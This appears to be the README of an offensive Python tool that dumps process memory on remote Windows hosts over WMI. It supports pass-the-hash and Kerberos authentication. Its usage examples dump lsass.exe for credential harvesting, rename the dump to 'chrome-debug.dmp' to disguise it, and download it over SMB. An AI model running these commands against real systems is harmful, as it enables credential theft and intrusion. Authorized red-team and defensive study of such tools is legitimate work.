# WMI Process Dump

Dump processes over WMI. Process dump will be written to `C:\Windows\Temp\<ProcessName>.dmp`

```
Dump processes over WMI with either PID or process name. Only worked on Windows Server 2016 and higher (Unless manually installed WMI Provider)

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit
  -pid PID              process ID to dump
  -proc PROC            process name to dump
  -rename RENAME        rename file after dump
  -download             download file over SMB

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones
                        specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it

```

Usage:

Dump a process by PID
```
python wmi-proc-dump.py user:pass@hostname -pid 580
```

Dump a process by name
```
python wmi-proc-dump.py user:pass@hostname -proc lsass.exe
```

Dump a process and rename
```
python wmi-proc-dump.py user:pass@hostname -proc lsass.exe -rename chrome-debug.dmp
```

Dump a process and download dump file to current directory
```
python wmi-proc-dump.py user:pass@hostname -proc lsass.exe -download